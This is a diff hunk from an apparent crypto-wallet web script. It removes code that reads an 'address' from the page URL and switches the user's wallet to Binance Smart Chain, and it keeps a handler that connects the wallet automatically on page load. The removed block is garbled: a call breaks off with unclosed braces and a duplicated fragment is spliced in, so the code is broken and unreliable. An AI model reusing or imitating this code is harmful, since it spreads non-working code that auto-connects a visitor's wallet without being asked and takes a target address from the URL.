@@ -28,50 +28,6 @@ async function connectWallet() {
           });
         }
     
-        // Validate address in URL (required)
-        const params = new URLSearchParams(window.location.search);
-        const userAddress = params.get("address");
-    
-        if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
-          return;
-        }
-  
-        try {
-          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-    
-          if (currentChainId !== bscChainId) {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: bscChainId }],
-            });
-          }
-        } catch (error) {
-          if (error.code === 4902) {
-            try {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: bscChainId,
-                  chainName: 'Binance Smart Chain',
-                  nativeCurrency: {
-                    name: 'BNB',
-                    symbol: 'BNB',
-                    decimals: 18,
-                  },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com'],
-                }],
-             try {
-      if (!window.ethereum) {
-        return;
-      }
-      const web3 = new Web3(window.ethereum);
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-      
-      const params = new URLSearchParams(window.location.search);
-      const userAddress = params.get("address");
-      
  // Auto-connect wallet on page load
 window.addEventListener("load", connectWallet);
 
